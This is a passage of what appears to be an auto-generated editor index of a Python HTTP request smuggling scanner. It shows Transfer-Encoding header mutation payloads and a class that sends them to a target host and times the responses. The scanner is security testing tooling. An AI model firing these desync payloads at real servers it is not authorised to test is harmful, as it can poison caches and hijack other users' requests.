        "peekOfCode": "mutations[\"spaceFF\"] = render_template(\"Transfer-Encoding:\\xFFchunked\")\nmutations[\"accentCH\"] = render_template(\"Transfer-Encoding: ch\\x96nked\")\nmutations[\"accentTE\"] = render_template(\"Transf\\x82r-Encoding: chunked\")\nmutations[\"x-rout\"] = render_template(\"X:X\\rTransfer-Encoding: chunked\")\nmutations[\"x-nout\"] = render_template(\"X:X\\nTransfer-Encoding: chunked\")\nfor i in range(0x1,0x20):\n\tmutations[\"midspace-%02x\"%i] = render_template(\"Transfer-Encoding:%cchunked\"%(i))\n\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))\n\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"accentCH\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"accentCH\"] = render_template(\"Transfer-Encoding: ch\\x96nked\")\nmutations[\"accentTE\"] = render_template(\"Transf\\x82r-Encoding: chunked\")\nmutations[\"x-rout\"] = render_template(\"X:X\\rTransfer-Encoding: chunked\")\nmutations[\"x-nout\"] = render_template(\"X:X\\nTransfer-Encoding: chunked\")\nfor i in range(0x1,0x20):\n\tmutations[\"midspace-%02x\"%i] = render_template(\"Transfer-Encoding:%cchunked\"%(i))\n\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))\n\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))\nfor i in range(0x7F,0x100):",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"accentTE\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"accentTE\"] = render_template(\"Transf\\x82r-Encoding: chunked\")\nmutations[\"x-rout\"] = render_template(\"X:X\\rTransfer-Encoding: chunked\")\nmutations[\"x-nout\"] = render_template(\"X:X\\nTransfer-Encoding: chunked\")\nfor i in range(0x1,0x20):\n\tmutations[\"midspace-%02x\"%i] = render_template(\"Transfer-Encoding:%cchunked\"%(i))\n\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))\n\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))\nfor i in range(0x7F,0x100):\n\tmutations[\"midspace-%02x\"%i] = render_template(\"Transfer-Encoding:%cchunked\"%(i))",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"x-rout\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"x-rout\"] = render_template(\"X:X\\rTransfer-Encoding: chunked\")\nmutations[\"x-nout\"] = render_template(\"X:X\\nTransfer-Encoding: chunked\")\nfor i in range(0x1,0x20):\n\tmutations[\"midspace-%02x\"%i] = render_template(\"Transfer-Encoding:%cchunked\"%(i))\n\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))\n\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))\nfor i in range(0x7F,0x100):\n\tmutations[\"midspace-%02x\"%i] = render_template(\"Transfer-Encoding:%cchunked\"%(i))\n\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"x-nout\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"x-nout\"] = render_template(\"X:X\\nTransfer-Encoding: chunked\")\nfor i in range(0x1,0x20):\n\tmutations[\"midspace-%02x\"%i] = render_template(\"Transfer-Encoding:%cchunked\"%(i))\n\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))\n\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))\nfor i in range(0x7F,0x100):\n\tmutations[\"midspace-%02x\"%i] = render_template(\"Transfer-Encoding:%cchunked\"%(i))\n\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))\n\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"midspace-%02x\"%i]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "\tmutations[\"midspace-%02x\"%i] = render_template(\"Transfer-Encoding:%cchunked\"%(i))\n\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))\n\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))\nfor i in range(0x7F,0x100):\n\tmutations[\"midspace-%02x\"%i] = render_template(\"Transfer-Encoding:%cchunked\"%(i))\n\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))\n\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"postspace-%02x\"%i]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))\n\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))\nfor i in range(0x7F,0x100):\n\tmutations[\"midspace-%02x\"%i] = render_template(\"Transfer-Encoding:%cchunked\"%(i))\n\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))\n\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"prespace-%02x\"%i]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))\nfor i in range(0x7F,0x100):\n\tmutations[\"midspace-%02x\"%i] = render_template(\"Transfer-Encoding:%cchunked\"%(i))\n\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))\n\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"endspace-%02x\"%i]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))\nfor i in range(0x7F,0x100):\n\tmutations[\"midspace-%02x\"%i] = render_template(\"Transfer-Encoding:%cchunked\"%(i))\n\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))\n\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"midspace-%02x\"%i]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "\tmutations[\"midspace-%02x\"%i] = render_template(\"Transfer-Encoding:%cchunked\"%(i))\n\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))\n\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"postspace-%02x\"%i]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))\n\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"prespace-%02x\"%i]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"endspace-%02x\"%i]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "Desyncr",
        "kind": 6,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "class Desyncr():\n\tdef __init__(self, configfile, smhost, smport=443, url=\"\", method=\"POST\", endpoint=\"/\",  SSLFlag=False, logh=None, smargs=None):\n\t\tself._configfile = configfile\n\t\tself._host = smhost\n\t\tself._port = smport\n\t\tself._method = method\n\t\tself._endpoint = endpoint\n\t\tself._vhost = smargs.vhost\n\t\tself._url = url\n\t\tself._timeout = float(smargs.timeout)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "process_uri",
        "kind": 2,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "def process_uri(uri):\n\tu = urlparse(uri)\n\tif u.scheme == \"https\":\n\t\tssl_flag = True\n\t\tstd_port = 443\n\telif u.scheme == \"http\":\n\t\tssl_flag = False\n\t\tstd_port = 80\n\telse:\n\t\tprint_info(\"Error malformed URL not supported: %s\" % (Fore.CYAN + uri))",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "CF",
        "kind": 2,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "def CF(text):\n\tglobal NOCOLOR\n\tif NOCOLOR:\n\t\tansi_escape = re.compile(r'\\x1B[@-_][0-?]*[ -/]*[@-~]')\n\t\ttext = ansi_escape.sub('', text)\n\treturn text\ndef banner(sm_version):\n\tprint(CF(Fore.CYAN))\n\tprint(CF(r\"  ______                         _              \"))\n\tprint(CF(r\" / _____)                       | |             \"))",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "banner",
        "kind": 2,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "def banner(sm_version):\n\tprint(CF(Fore.CYAN))\n\tprint(CF(r\"  ______                         _              \"))\n\tprint(CF(r\" / _____)                       | |             \"))\n\tprint(CF(r\"( (____  ____  _   _  ____  ____| | _____  ____ \"))\n\tprint(CF(r\" \\____ \\|    \\| | | |/ _  |/ _  | || ___ |/ ___)\"))\n\tprint(CF(r\" _____) ) | | | |_| ( (_| ( (_| | || ____| |    \"))\n\tprint(CF(r\"(______/|_|_|_|____/ \\___ |\\___ |\\_)_____)_|    \"))\n\tprint(CF(r\"                    (_____(_____|               \"))\n\tprint(CF(r\"\"))",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "print_info",
        "kind": 2,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "def print_info(msg, file_handle=None):\n\tansi_escape = re.compile(r'\\x1B[@-_][0-?]*[ -/]*[@-~]')\n\tmsg = Style.BRIGHT + Fore.MAGENTA + \"[%s] %s\"%(Fore.CYAN+'+'+Fore.MAGENTA, msg) + Style.RESET_ALL\n\tplaintext = ansi_escape.sub('', msg)\n\tprint(CF(msg))\n\tif file_handle is not None:\n\t\tfile_handle.write(plaintext+\"\\n\")\nif __name__ == \"__main__\":\n\tglobal NOCOLOR\n\tif sys.version_info < (3, 0):",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tself._configfile",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tself._configfile = configfile\n\t\tself._host = smhost\n\t\tself._port = smport\n\t\tself._method = method\n\t\tself._endpoint = endpoint\n\t\tself._vhost = smargs.vhost\n\t\tself._url = url\n\t\tself._timeout = float(smargs.timeout)\n\t\tself.ssl_flag = SSLFlag\n\t\tself._logh = logh",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tself._host",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tself._host = smhost\n\t\tself._port = smport\n\t\tself._method = method\n\t\tself._endpoint = endpoint\n\t\tself._vhost = smargs.vhost\n\t\tself._url = url\n\t\tself._timeout = float(smargs.timeout)\n\t\tself.ssl_flag = SSLFlag\n\t\tself._logh = logh\n\t\tself._quiet = smargs.quiet",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tself._port",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tself._port = smport\n\t\tself._method = method\n\t\tself._endpoint = endpoint\n\t\tself._vhost = smargs.vhost\n\t\tself._url = url\n\t\tself._timeout = float(smargs.timeout)\n\t\tself.ssl_flag = SSLFlag\n\t\tself._logh = logh\n\t\tself._quiet = smargs.quiet\n\t\tself._exit_early = smargs.exit_early",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tself._method",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tself._method = method\n\t\tself._endpoint = endpoint\n\t\tself._vhost = smargs.vhost\n\t\tself._url = url\n\t\tself._timeout = float(smargs.timeout)\n\t\tself.ssl_flag = SSLFlag\n\t\tself._logh = logh\n\t\tself._quiet = smargs.quiet\n\t\tself._exit_early = smargs.exit_early\n\t\tself._attempts = 0",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tself._endpoint",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tself._endpoint = endpoint\n\t\tself._vhost = smargs.vhost\n\t\tself._url = url\n\t\tself._timeout = float(smargs.timeout)\n\t\tself.ssl_flag = SSLFlag\n\t\tself._logh = logh\n\t\tself._quiet = smargs.quiet\n\t\tself._exit_early = smargs.exit_early\n\t\tself._attempts = 0\n\t\tself._cookies = []",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tself._vhost",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tself._vhost = smargs.vhost\n\t\tself._url = url\n\t\tself._timeout = float(smargs.timeout)\n\t\tself.ssl_flag = SSLFlag\n\t\tself._logh = logh\n\t\tself._quiet = smargs.quiet\n\t\tself._exit_early = smargs.exit_early\n\t\tself._attempts = 0\n\t\tself._cookies = []\n\tdef _test(self, payload_obj):",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tself._url",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tself._url = url\n\t\tself._timeout = float(smargs.timeout)\n\t\tself.ssl_flag = SSLFlag\n\t\tself._logh = logh\n\t\tself._quiet = smargs.quiet\n\t\tself._exit_early = smargs.exit_early\n\t\tself._attempts = 0\n\t\tself._cookies = []\n\tdef _test(self, payload_obj):\n\t\ttry:",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tself._timeout",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tself._timeout = float(smargs.timeout)\n\t\tself.ssl_flag = SSLFlag\n\t\tself._logh = logh\n\t\tself._quiet = smargs.quiet\n\t\tself._exit_early = smargs.exit_early\n\t\tself._attempts = 0\n\t\tself._cookies = []\n\tdef _test(self, payload_obj):\n\t\ttry:\n\t\t\tweb = EasySSL(self.ssl_flag)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tself.ssl_flag",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tself.ssl_flag = SSLFlag\n\t\tself._logh = logh\n\t\tself._quiet = smargs.quiet\n\t\tself._exit_early = smargs.exit_early\n\t\tself._attempts = 0\n\t\tself._cookies = []\n\tdef _test(self, payload_obj):\n\t\ttry:\n\t\t\tweb = EasySSL(self.ssl_flag)\n\t\t\tweb.connect(self._host, self._port, self._timeout)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tself._logh",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tself._logh = logh\n\t\tself._quiet = smargs.quiet\n\t\tself._exit_early = smargs.exit_early\n\t\tself._attempts = 0\n\t\tself._cookies = []\n\tdef _test(self, payload_obj):\n\t\ttry:\n\t\t\tweb = EasySSL(self.ssl_flag)\n\t\t\tweb.connect(self._host, self._port, self._timeout)\n\t\t\tweb.send(str(payload_obj).encode())",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tself._quiet",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tself._quiet = smargs.quiet\n\t\tself._exit_early = smargs.exit_early\n\t\tself._attempts = 0\n\t\tself._cookies = []\n\tdef _test(self, payload_obj):\n\t\ttry:\n\t\t\tweb = EasySSL(self.ssl_flag)\n\t\t\tweb.connect(self._host, self._port, self._timeout)\n\t\t\tweb.send(str(payload_obj).encode())\n\t\t\t#print(payload_obj)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tself._exit_early",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tself._exit_early = smargs.exit_early\n\t\tself._attempts = 0\n\t\tself._cookies = []\n\tdef _test(self, payload_obj):\n\t\ttry:\n\t\t\tweb = EasySSL(self.ssl_flag)\n\t\t\tweb.connect(self._host, self._port, self._timeout)\n\t\t\tweb.send(str(payload_obj).encode())\n\t\t\t#print(payload_obj)\n\t\t\tstart_time = datetime.now()",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tself._attempts",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tself._attempts = 0\n\t\tself._cookies = []\n\tdef _test(self, payload_obj):\n\t\ttry:\n\t\t\tweb = EasySSL(self.ssl_flag)\n\t\t\tweb.connect(self._host, self._port, self._timeout)\n\t\t\tweb.send(str(payload_obj).encode())\n\t\t\t#print(payload_obj)\n\t\t\tstart_time = datetime.now()\n\t\t\tres = web.recv_nb(self._timeout)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tself._cookies",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tself._cookies = []\n\tdef _test(self, payload_obj):\n\t\ttry:\n\t\t\tweb = EasySSL(self.ssl_flag)\n\t\t\tweb.connect(self._host, self._port, self._timeout)\n\t\t\tweb.send(str(payload_obj).encode())\n\t\t\t#print(payload_obj)\n\t\t\tstart_time = datetime.now()\n\t\t\tres = web.recv_nb(self._timeout)\n\t\t\tend_time = datetime.now()",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tweb",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tweb = EasySSL(self.ssl_flag)\n\t\t\tweb.connect(self._host, self._port, self._timeout)\n\t\t\tweb.send(str(payload_obj).encode())\n\t\t\t#print(payload_obj)\n\t\t\tstart_time = datetime.now()\n\t\t\tres = web.recv_nb(self._timeout)\n\t\t\tend_time = datetime.now()\n\t\t\tweb.close()\n\t\t\tif res is None:\n\t\t\t\tdelta_time = end_time - start_time",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tstart_time",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tstart_time = datetime.now()\n\t\t\tres = web.recv_nb(self._timeout)\n\t\t\tend_time = datetime.now()\n\t\t\tweb.close()\n\t\t\tif res is None:\n\t\t\t\tdelta_time = end_time - start_time\n\t\t\t\tif delta_time.seconds < (self._timeout-1):\n\t\t\t\t\treturn (2, res, payload_obj) # Return code 2 if disconnected before timeout\n\t\t\t\treturn (1, res, payload_obj) # Return code 1 if connection timedout\n\t\t\t# Filter out problematic characters",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tres",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tres = web.recv_nb(self._timeout)\n\t\t\tend_time = datetime.now()\n\t\t\tweb.close()\n\t\t\tif res is None:\n\t\t\t\tdelta_time = end_time - start_time\n\t\t\t\tif delta_time.seconds < (self._timeout-1):\n\t\t\t\t\treturn (2, res, payload_obj) # Return code 2 if disconnected before timeout\n\t\t\t\treturn (1, res, payload_obj) # Return code 1 if connection timedout\n\t\t\t# Filter out problematic characters\n\t\t\tres_filtered = \"\"",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tend_time",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tend_time = datetime.now()\n\t\t\tweb.close()\n\t\t\tif res is None:\n\t\t\t\tdelta_time = end_time - start_time\n\t\t\t\tif delta_time.seconds < (self._timeout-1):\n\t\t\t\t\treturn (2, res, payload_obj) # Return code 2 if disconnected before timeout\n\t\t\t\treturn (1, res, payload_obj) # Return code 1 if connection timedout\n\t\t\t# Filter out problematic characters\n\t\t\tres_filtered = \"\"\n\t\t\tfor single in res:",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tdelta_time",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\t\tdelta_time = end_time - start_time\n\t\t\t\tif delta_time.seconds < (self._timeout-1):\n\t\t\t\t\treturn (2, res, payload_obj) # Return code 2 if disconnected before timeout\n\t\t\t\treturn (1, res, payload_obj) # Return code 1 if connection timedout\n\t\t\t# Filter out problematic characters\n\t\t\tres_filtered = \"\"\n\t\t\tfor single in res:\n\t\t\t\tif single > 0x7F:\n\t\t\t\t\tres_filtered += '\\x30'\n\t\t\t\telse:",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tres_filtered",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tres_filtered = \"\"\n\t\t\tfor single in res:\n\t\t\t\tif single > 0x7F:\n\t\t\t\t\tres_filtered += '\\x30'\n\t\t\t\telse:\n\t\t\t\t\tres_filtered += chr(single)\n\t\t\tres = res_filtered\n\t\t\t#if '504' in res:\n\t\t\t#print(\"\\n\\n\"+str(str(payload_obj)))\n\t\t\t#print(\"\\n\\n\"+res)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tres",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tres = res_filtered\n\t\t\t#if '504' in res:\n\t\t\t#print(\"\\n\\n\"+str(str(payload_obj)))\n\t\t\t#print(\"\\n\\n\"+res)\n\t\t\treturn (0, res, payload_obj) # Return code 0 if normal response returned\n\t\texcept Exception as exception_data:\n\t\t\t#print(exception_data)\n\t\t\treturn (-1, None, payload_obj) # Return code -1 if some except occured\n\tdef _get_cookies(self):\n\t\tRN = \"\\r\\n\"",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tRN",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tRN = \"\\r\\n\"\n\t\ttry:\n\t\t\tcookies = []\n\t\t\tweb = EasySSL(self.ssl_flag)\n\t\t\tweb.connect(self._host, self._port, 2.0)\n\t\t\tp = Payload()\n\t\t\tp.host = self._host\n\t\t\tp.method = \"GET\"\n\t\t\tp.endpoint = self._endpoint\n\t\t\tp.header  = \"__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1\" + RN",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tcookies",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tcookies = []\n\t\t\tweb = EasySSL(self.ssl_flag)\n\t\t\tweb.connect(self._host, self._port, 2.0)\n\t\t\tp = Payload()\n\t\t\tp.host = self._host\n\t\t\tp.method = \"GET\"\n\t\t\tp.endpoint = self._endpoint\n\t\t\tp.header  = \"__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1\" + RN\n\t\t\tp.header += \"Host: __HOST__\" + RN\n\t\t\tp.header += \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36\" + RN",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tweb",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tweb = EasySSL(self.ssl_flag)\n\t\t\tweb.connect(self._host, self._port, 2.0)\n\t\t\tp = Payload()\n\t\t\tp.host = self._host\n\t\t\tp.method = \"GET\"\n\t\t\tp.endpoint = self._endpoint\n\t\t\tp.header  = \"__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1\" + RN\n\t\t\tp.header += \"Host: __HOST__\" + RN\n\t\t\tp.header += \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36\" + RN\n\t\t\tp.header += \"Content-type: application/x-www-form-urlencoded; charset=UTF-8\" + RN",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tp",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
